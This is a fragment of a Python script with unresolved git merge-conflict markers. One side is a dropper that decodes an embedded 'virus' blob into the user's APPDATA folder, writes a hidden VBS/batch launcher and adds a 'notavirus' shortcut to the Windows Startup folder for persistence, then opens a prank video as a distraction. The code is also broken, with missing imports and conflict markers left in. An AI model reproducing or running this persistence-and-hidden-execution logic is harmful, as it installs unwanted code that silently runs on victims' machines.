from pathlib import Path

<<<<<<< Updated upstream
dirLoc = f'{os.getenv("APPDATA")}'
target = f'{dirLoc}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notavirus.lnk'
decrypt = base64.b85decode(virus)
with Path("tmp.zip") as file:
    file.write_bytes(decrypt)
with ZipFile("tmp.zip", "r", zipfile.ZIP_DEFLATED) as file:
    file.extractall(dirLoc)
os.remove("tmp.zip")
virusDir = os.path.join(dirLoc, "notavirus")
with Path(os.path.join(virusDir, "runner.bat")) as file:
    file.write_text(f'@echo off\n"{os.path.join(virusDir, "piss", "python.exe")}" "{os.path.join(virusDir, "main.py")}"')
with Path(os.path.join(virusDir, "run.vbs")) as file:
    file.write_text(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{os.path.join(virusDir, "runner.bat")}",0,True')
createShortcut(target, os.path.join(virusDir, "run.vbs"))
url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
webbrowser.open(url)
=======
with Path("main.py") as file:
    file.write_text(Path("notavirus").read_text() + "\n\n" + Path("dimsim").read_text())
    
>>>>>>> Stashed changes
